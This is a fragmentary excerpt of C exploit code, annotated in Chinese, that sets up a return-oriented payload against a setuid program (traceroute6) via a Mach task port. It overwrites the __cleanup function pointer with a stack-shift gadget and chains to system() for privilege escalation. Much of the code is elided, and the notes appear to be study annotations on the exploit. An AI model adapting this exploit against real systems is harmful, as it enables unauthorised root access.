...
char** setup_payload_and_offsets(uint64_t* stack_shift, uint64_t* fptr_page, uint32_t* fptr_offset) {
  ...
  *fptr_offset = ((uint64_t)(&__cleanup)) - *fptr_page;
  ...
  } while (ret != NULL && ((count_nulls((uint64_t)ret)) != 2) );  //检查 ret 地址中 null字节个数和后面代码设置 ret到 argv 相关
...
*/
  int ret_slide_length = ((realpath_shift_amount - traceroute6_stack_size) / 8 / 5) * 2;  //单位是 字节
...
// 6表示 提权的代码 {pop_rdi_ret -- &system}
  ...
  // 将 args_u64 中0，2，3，。。。数据拷贝到 target_argv 数组
...
void sploit(int child_pid, mach_port_t child_task_port) {
  ...
  uint64_t fptr_page = 0;       // 目标位置 （__cleanup）
  uint32_t fptr_offset = 0;     // 目标位置的 offset
  uint64_t stack_shift_gadget = 0;  // 用来覆盖的 fptr
